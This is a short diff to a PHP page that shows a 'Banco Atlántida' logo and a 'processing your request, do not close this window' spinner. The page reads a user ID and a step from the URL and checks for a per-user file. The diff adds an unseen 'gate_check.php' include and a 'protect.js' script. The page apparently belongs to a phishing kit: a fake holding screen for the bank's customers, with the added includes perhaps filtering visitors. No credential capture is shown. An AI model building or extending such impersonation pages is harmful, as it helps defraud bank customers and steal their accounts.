@@ -1,4 +1,5 @@
 <?php
+require_once __DIR__ . '/gate_check.php';
 $usuario = trim($_GET['u'] ?? '');
 $step    = trim($_GET['step'] ?? '');
 if (!$usuario) {
@@ -64,12 +65,13 @@ if (file_exists($archivo)) {
   </style>
 </head>
 <body>
-  <img src="img/logo-ba.svg" class="logo" alt="Banco Atlántida"/>
+  <img src="img/logo-ba.svg" class="logo" alt="Banco Atl&#225;ntida"/>
   <div class="spinner">
     <div class="ring r1"></div>
     <div class="ring r2"></div>
   </div>
   <p>Estamos procesando tu solicitud...</p>
   <small>No cierres esta ventana</small>
+<script src="protect.js"></script>
 </body>
 </html>
